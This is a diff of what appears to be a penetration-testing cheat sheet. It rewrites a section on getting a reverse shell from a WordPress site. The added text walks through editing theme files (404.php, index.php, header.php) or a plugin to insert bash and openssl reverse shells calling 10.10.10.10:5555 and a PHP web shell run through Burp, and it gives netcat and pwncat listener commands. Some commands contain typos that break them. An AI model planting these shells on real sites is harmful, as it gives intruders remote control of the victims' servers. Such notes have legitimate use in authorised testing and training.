@@ -186,31 +186,6 @@ Pentestmonkey <li>http://pentestmonkey.net/</li>
 
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'
 
- Wordpress example 1.
- 
-+-------------------+
-
-After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.
-
-Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
-
- Wordpress example 2.
- 
-+-------------------+
-
-Edit "header.php"
-
-Under php tag
-
-<code>echo system($ REQUESTS['cmd']);</code>
-
-change request metod by left click
-
-open upp burp and run command in the bottom of the page:
-
-<code>cmd=whomai</code>
-
-<code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
 
 <h2>PHP</h2>
 
@@ -419,3 +394,61 @@ example 1.
 example 2.
 
 <code>john hash-file.txt</code>
+
+
+<h2>Get Reverse-Shell in Wordpress</h2>
+
+The best thing is to edit the 404.php file for the theme in use, as it dont hang the hole wordpress site, if you need to check the site for more information.
+
+
+First you need so set up your listner:
+
+<code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
+
+Then just surf to the victim´s wordpress site and try a site that dont exist and it gives you a 404 eror.
+
+
+
+Wordpress example 1.
+
++-------------------+
+
+Edit index.php on a theme thats not in used.
+
+Between :
+
+get_header(); ?>
+
+<code>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s</code>
+
+<div class="wrap">
+  
+Wordpress example 2.
+ 
++-------------------+
+
+After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.
+
+Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
+
+ Wordpress example 3.
+ 
++-------------------+
+
+Edit "header.php"
+
+Under php tag
+
+<code>echo system($ REQUESTS['cmd']);</code>
+
+change request metod by left click
+
+open upp burp and run command in the bottom of the page:
+
+<code>cmd=whomai</code>
+
+<code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
+
+
+
+
